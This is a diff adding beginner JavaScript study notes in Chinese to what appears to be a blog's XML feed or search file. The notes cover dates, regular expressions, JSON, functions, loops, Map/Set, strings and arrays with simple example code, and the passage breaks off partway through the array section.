+      <url>2020/08/29/JS_0X05/</url>
+      
+        <content type="html"><![CDATA[<h1 id="标准对象"><a href="#标准对象" class="headerlink" title="标准对象"></a>标准对象</h1><h2 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h2><p><code>Date</code>对象用来表示日期和时间。</p><p>如要获取系统当前时间（获取的是本机时间，本机时间不准的话…<code>emmmmmmmmmmm</code>）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> now = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">now; <span class="comment">// Wed Jun 24 2015 19:49:22 GMT+0800 (CST)</span></span><br><span class="line">now.getFullYear(); <span class="comment">// 2015, 年份</span></span><br><span class="line">now.getMonth(); <span class="comment">// 5, 月份，注意月份范围是0~11，5表示六月</span></span><br><span class="line">now.getDate(); <span class="comment">// 24, 表示24号</span></span><br><span class="line">now.getDay(); <span class="comment">// 3, 表示星期三</span></span><br><span class="line">now.getHours(); <span class="comment">// 19, 24小时制</span></span><br><span class="line">now.getMinutes(); <span class="comment">// 49, 分钟</span></span><br><span class="line">now.getSeconds(); <span class="comment">// 22, 秒</span></span><br><span class="line">now.getMilliseconds(); <span class="comment">// 875, 毫秒数</span></span><br><span class="line">now.getTime(); <span class="comment">// 1435146562875, 以number形式表示的时间戳</span></span><br></pre></td></tr></table></figure><h2 id="RegExp"><a href="#RegExp" class="headerlink" title="RegExp"></a>RegExp</h2><blockquote><p>俗称—-正则表达式！就是<code>py</code>的<code>re</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\d <span class="comment">//匹配数字</span></span><br><span class="line">\w <span class="comment">//匹配字母或者数字</span></span><br></pre></td></tr></table></figure><ul><li><code>&#39;00\d&#39;</code>可以匹配<code>&#39;007&#39;</code>，但无法匹配<code>&#39;00A&#39;</code>；</li><li><code>&#39;\d\d\d&#39;</code>可以匹配<code>&#39;010&#39;</code>；</li><li><code>&#39;\w\w&#39;</code>可以匹配<code>&#39;js&#39;</code>；</li><li><code>\d&#123;3&#125;</code>表示匹配3个数字，例如<code>&#39;010&#39;</code>；</li><li><code>\s</code>可以匹配一个空格（也包括Tab等空白符），所以<code>\s+</code>表示至少有一个空格，例如匹配<code>&#39; &#39;</code>，<code>&#39;\t\t&#39;</code>等；</li><li><code>\d&#123;3,8&#125;</code>表示3-8个数字，例如<code>&#39;1234567&#39;</code>。</li></ul></blockquote><h3 id="JS创建正则表达式"><a href="#JS创建正则表达式" class="headerlink" title="JS创建正则表达式"></a>JS创建正则表达式</h3><ol><li>直接通过<code>/正则表达式/</code>写出来</li><li>通过<code>new RegExp(&#39;正则表达式&#39;)</code>创建一个RegExp对象。</li></ol><blockquote><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> re1 = <span class="regexp">/ABC\-001/</span>;</span><br><span class="line"><span class="keyword">var</span> re2 = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;ABC\\-001&#x27;</span>);</span><br><span class="line"></span><br><span class="line">re1; <span class="comment">// /ABC\-001/</span></span><br><span class="line">re2; <span class="comment">// /ABC\-001/</span></span><br></pre></td></tr></table></figure><p>如果正则表达式中定义了组，就可以在<code>RegExp</code>对象上用<code>exec()</code>方法提取出子串来。</p></blockquote><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><p><code>JSON</code>是<code>JavaScript Object Notation</code>的缩写，它是一种数据交换格式,并且JSON定死了编码必须是<code>UTF-8</code>。</p><p>json的数据类型</p><blockquote><p>number：和JavaScript的number完全一致；<br>Boolean：就是JavaScript的true或false；<br>string：就是JavaScript的string；<br>null：就是JavaScript的null；<br>array：就是JavaScript的Array表示方式——[]；<br>object：就是JavaScript的{ … }表示方式。</p></blockquote><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p><code>js--&gt;json</code>，直接用例子理解吧</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    name: <span class="string">&#x27;小明&#x27;</span>,</span><br><span class="line">    age: <span class="number">14</span>,</span><br><span class="line">    gender: <span class="literal">true</span>,</span><br><span class="line">    height: <span class="number">1.65</span>,</span><br><span class="line">    grade: <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;middle-school&#x27;</span>: <span class="string">&#x27;\&quot;W3C\&quot; Middle School&#x27;</span>,</span><br><span class="line">    skills: [<span class="string">&#x27;JavaScript&#x27;</span>, <span class="string">&#x27;Java&#x27;</span>, <span class="string">&#x27;Python&#x27;</span>, <span class="string">&#x27;Lisp&#x27;</span>]</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">JSON</span>.stringify(xiaoming);  <span class="comment">//把这个对象序列化成JSON格式的字符串</span></span><br><span class="line"><span class="built_in">console</span>.log(s);</span><br></pre></td></tr></table></figure><blockquote><p>筛选对象的键值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(xiaoming, [<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;skills&#x27;</span>], <span class="string">&#x27;  &#x27;</span>);</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;小明&quot;</span>,</span><br><span class="line">  <span class="string">&quot;skills&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;JavaScript&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Java&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Python&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Lisp&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>​    </p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>JSON –&gt; JS</p><p>用<code>JSON.parse()</code>把它变成一个JavaScript对象,例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;[1,2,3,true]&#x27;</span>); <span class="comment">// [1, 2, 3, true]</span></span><br><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;name&quot;:&quot;小明&quot;,&quot;age&quot;:14&#125;&#x27;</span>); <span class="comment">// Object &#123;name: &#x27;小明&#x27;, age: 14&#125;</span></span><br><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;true&#x27;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;123.45&#x27;</span>); <span class="comment">// 123.45</span></span><br></pre></td></tr></table></figure><p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> JS学习笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JavaScript </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>JS笔记(0X04)</title>
+      <link href="2020/08/28/JS_0X04/"/>
+      <url>2020/08/28/JS_0X04/</url>
+      
+        <content type="html"><![CDATA[<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><blockquote><p>按我自己用<code>py</code>来理解的话..<code>function</code>相当于<code>def</code> ，<code>abs</code>就是函数名，<code>x</code>是函数内的参数，{…}是函数的内容</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abs</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> -x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="将函数赋值给变量"><a href="#将函数赋值给变量" class="headerlink" title="将函数赋值给变量"></a>将函数赋值给变量</h2><blockquote><p><code>function</code>是一个匿名函数，函数的值给了<code>abs</code>，调用函数的时候只需要调用<code>abs</code>就可以了。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> abs = <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> -x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h2><blockquote><p>直接调用，例如：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> abs = <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> -x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>调用函数时，按顺序传入参数即可：</p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abs(<span class="number">10</span>); <span class="comment">// 返回10</span></span><br><span class="line">abs(<span class="number">-9</span>); <span class="comment">// 返回9</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="return的坑"><a href="#return的坑" class="headerlink" title="return的坑"></a>return的坑</h2><blockquote><p><code>javascript</code>的自动添加分号机制，会影响如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">        &#123; <span class="attr">name</span>: <span class="string">&#x27;foo&#x27;</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line">foo(); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><p>实际上会变成：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">        &#123; <span class="attr">name</span>: <span class="string">&#x27;foo&#x27;</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line">foo(); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><p>所以多行写法要加{}，例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span>&#123;</span><br><span class="line"><span class="string">&quot;whh6tl&quot;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></blockquote><p>写代码之前尽量加上：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;<span class="comment">//防止全区变量，如a = 1; ，会自动转换成 var a = 1;</span></span><br><span class="line">xxxxxxx;</span><br><span class="line">xxxxxxx;</span><br></pre></td></tr></table></figure><h2 id="嵌套函数实例"><a href="#嵌套函数实例" class="headerlink" title="嵌套函数实例"></a>嵌套函数实例</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> whh = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span> : <span class="string">&quot;wdw&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span> : <span class="number">12</span>,</span><br><span class="line">    <span class="string">&quot;wheel&quot;</span> : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="number">9</span>;</span><br><span class="line">        b = a * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> JS学习笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JavaScript </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>JS笔记(0X03)</title>
+      <link href="2020/08/27/JS_0X03/"/>
+      <url>2020/08/27/JS_0X03/</url>
+      
+        <content type="html"><![CDATA[<h1 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h1><p>格式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(xxx)&#123;</span><br><span class="line">...;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ooo)&#123;</span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再恶心一点就是：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//俄罗斯套娃</span></span><br><span class="line"><span class="keyword">if</span>(xx)&#123;</span><br><span class="line">    ...;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ooo)&#123;</span><br><span class="line">        ...;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        ...;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用户输入判断"><a href="#用户输入判断" class="headerlink" title="用户输入判断"></a>用户输入判断</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> height = <span class="built_in">parseFloat</span>(prompt(<span class="string">&#x27;请输入身高(m):&#x27;</span>));</span><br><span class="line"><span class="keyword">var</span> weight = <span class="built_in">parseFloat</span>(prompt(<span class="string">&#x27;请输入体重(kg):&#x27;</span>));</span><br></pre></td></tr></table></figure><h1 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h1><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> i;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">1</span>; i&lt;=<span class="number">10000</span>; i++) &#123;</span><br><span class="line">    x = x + i;</span><br><span class="line">&#125;</span><br><span class="line">x; <span class="comment">// 50005000,计算从1+2+3+...+10000</span></span><br></pre></td></tr></table></figure><blockquote><p>遍历数组的例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;Apple&#x27;</span>, <span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Microsoft&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> i, x;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;arr.length; i++) &#123;</span><br><span class="line">    x = arr[i];</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><h3 id="for…in"><a href="#for…in" class="headerlink" title="for…in"></a>for…in</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">    name: <span class="string">&#x27;Jack&#x27;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    city: <span class="string">&#x27;Beijing&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> o) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key); <span class="comment">// &#x27;name&#x27;, &#x27;age&#x27;, &#x27;city&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> n = <span class="number">99</span>;</span><br><span class="line"><span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    x = x + n;</span><br><span class="line">    n = n - <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">x; <span class="comment">// 2500</span></span><br></pre></td></tr></table></figure><h1 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h1><blockquote><p><code>map</code>相当于<code>py</code>的字典</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>([[<span class="string">&#x27;Michael&#x27;</span>, <span class="number">95</span>], [<span class="string">&#x27;Bob&#x27;</span>, <span class="number">75</span>], [<span class="string">&#x27;Tracy&#x27;</span>, <span class="number">85</span>]]);</span><br><span class="line">m.get(<span class="string">&#x27;Michael&#x27;</span>); <span class="comment">// 95</span></span><br></pre></td></tr></table></figure><blockquote><p>键值对的“键”不能重复，否则会把之前同名的键的值替换掉</p></blockquote><h1 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h1><blockquote><p>Set有键，无值，并且键会自动去重</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="string">&#x27;3&#x27;</span>]);</span><br><span class="line">s; <span class="comment">// Set &#123;1, 2, 3, &quot;3&quot;&#125;</span></span><br></pre></td></tr></table></figure><p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> JS学习笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JavaScript </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>JS笔记(0X02)</title>
+      <link href="2020/08/26/JS_0X02/"/>
+      <url>2020/08/26/JS_0X02/</url>
+      
+        <content type="html"><![CDATA[<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><p>当字符串中包含<code>‘</code>或者<code>“</code>时，需要转义，例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;I\&#x27;m \&quot;OK\&quot;!&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="多行字符串"><a href="#多行字符串" class="headerlink" title="多行字符串"></a>多行字符串</h2><p>用反引号`表示，就是Tab上面哪个键，1左边那个键。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`王火火</span></span><br><span class="line"><span class="string">可</span></span><br><span class="line"><span class="string">不太</span></span><br><span class="line"><span class="string">捞</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure><h2 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h2><p><code>感觉就像是引用变量，像python的format</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;小明&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> age = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">var</span> message = <span class="string">`你好, <span class="subst">$&#123;name&#125;</span>, 你今年<span class="subst">$&#123;age&#125;</span>岁了!`</span>;</span><br><span class="line">alert(message);</span><br></pre></td></tr></table></figure><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><blockquote><p>相当于<code>py</code>的列表，感觉不难理解，就直接来吧</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">10</span>, <span class="number">20</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;xyz&#x27;</span>];</span><br><span class="line">arr.indexOf(<span class="number">10</span>); <span class="comment">// 元素10的索引为0</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>];</span><br><span class="line">arr.slice(<span class="number">0</span>, <span class="number">3</span>); <span class="comment">// 从索引0开始，到索引3结束，但不包括索引3: [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;]</span></span><br><span class="line">arr.slice(<span class="number">3</span>); <span class="comment">// 从索引3开始到结束: [&#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;]</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//push()向Array的末尾添加若干元素，pop()则把Array的最后一个元素删除掉</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">arr.push(<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>); <span class="comment">// 返回Array新的长度: 4</span></span><br><span class="line">arr; <span class="comment">// [1, 2, &#x27;A&#x27;, &#x27;B&#x27;]</span></span><br><span class="line">arr.pop(); <span class="comment">// pop()返回&#x27;B&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//unshift:往头部添加新元素</span></span><br><span class="line"><span class="comment">//shift：删除头部第一个元素</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">arr.unshift(<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>); <span class="comment">// 返回Array新的长度: 4</span></span><br><span class="line">arr; <span class="comment">// [&#x27;A&#x27;, &#x27;B&#x27;, 1, 2]</span></span><br><span class="line">arr.shift(); <span class="comment">// &#x27;A&#x27;</span></span><br><span class="line">arr; <span class="comment">// [&#x27;B&#x27;, 1, 2]</span></span><br></pre></td></tr></table></figure><blockquote><p>万能方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//splice()方法是修改Array的“万能方法”，它可以从指定的索引开始删除若干元素，然后再从该位置添加若干元素：</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;Microsoft&#x27;</span>, <span class="string">&#x27;Apple&#x27;</span>, <span class="string">&#x27;Yahoo&#x27;</span>, <span class="string">&#x27;AOL&#x27;</span>, <span class="string">&#x27;Excite&#x27;</span>, <span class="string">&#x27;Oracle&#x27;</span>];</span><br><span class="line"><span class="comment">// 从索引2开始删除3个元素,然后再添加两个元素:</span></span><br><span class="line">arr.splice(<span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Facebook&#x27;</span>); <span class="comment">// 返回删除的元素 [&#x27;Yahoo&#x27;, &#x27;AOL&#x27;, &#x27;Excite&#x27;]</span></span><br><span class="line">arr; <span class="comment">// [&#x27;Microsoft&#x27;, &#x27;Apple&#x27;, &#x27;Google&#x27;, &#x27;Facebook&#x27;, &#x27;Oracle&#x27;]</span></span><br><span class="line"><span class="comment">// 只删除,不添加:</span></span><br><span class="line">arr.splice(<span class="number">2</span>, <span class="number">2</span>); <span class="comment">// [&#x27;Google&#x27;, &#x27;Facebook&#x27;]</span></span><br><span class="line">arr; <span class="comment">// [&#x27;Microsoft&#x27;, &#x27;Apple&#x27;, &#x27;Oracle&#x27;]</span></span><br><span class="line"><span class="comment">// 只添加,不删除:</span></span><br><span class="line">arr.splice(<span class="number">2</span>, <span class="number">0</span>, <span 